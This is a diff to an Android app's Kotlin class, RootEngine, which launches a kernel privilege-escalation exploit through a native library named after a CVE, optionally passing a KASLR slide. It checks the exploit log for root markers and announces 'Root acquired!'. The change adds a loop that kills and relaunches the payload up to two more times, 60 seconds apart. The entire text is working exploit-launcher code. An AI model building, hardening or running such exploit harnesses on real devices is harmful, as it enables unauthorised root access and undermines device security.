@@ -879,6 +879,8 @@ class RootEngine(private val context: Context) {
                 localSoFile.setReadable(true, false); localSoFile.setExecutable(true, false)
                 logFilePath = File(context.filesDir, "exploit.log").absolutePath
                 File(logFilePath).delete()
+                var localRelaunches = 0
+                while (true) {
                 appendLog("[Exploit] Launching via libcve43499root.so...")
                 val pb = ProcessBuilder(helperFile.absolutePath, "--run-payload", localSoFile.absolutePath, helperFile.absolutePath, logFilePath).redirectErrorStream(true)
                 if (kaslr.isNotEmpty()) pb.environment()["SLIDE_P0_OFFSET"] = kaslr
@@ -908,6 +910,15 @@ class RootEngine(private val context: Context) {
                 if (finalLog.contains("done=1 root=1") && finalLog.contains("exploit completed attempt=")) { success = true }
                 if (finalLog.contains("pipe overwrite succeeded")) { success = true }
                 else if (!success) { val early = process.inputStream?.bufferedReader()?.use { it.readText() }?.trim() ?: ""; if (early.isNotEmpty()) appendLog("[STDOUT] $early") }
+
+                if (success || finalStatus == "Reboot required" || localRelaunches >= 2) break
+                localRelaunches++
+                appendLog("[Retry] No success yet — relaunching the payload (retry $localRelaunches/2)…")
+                runCatching { process.destroyForcibly() }
+                attempts = 0
+                lastLog = ""
+                delay(60_000L)
+                }
 
                 if (success) {
                     appendLog("[Success] Root acquired!")
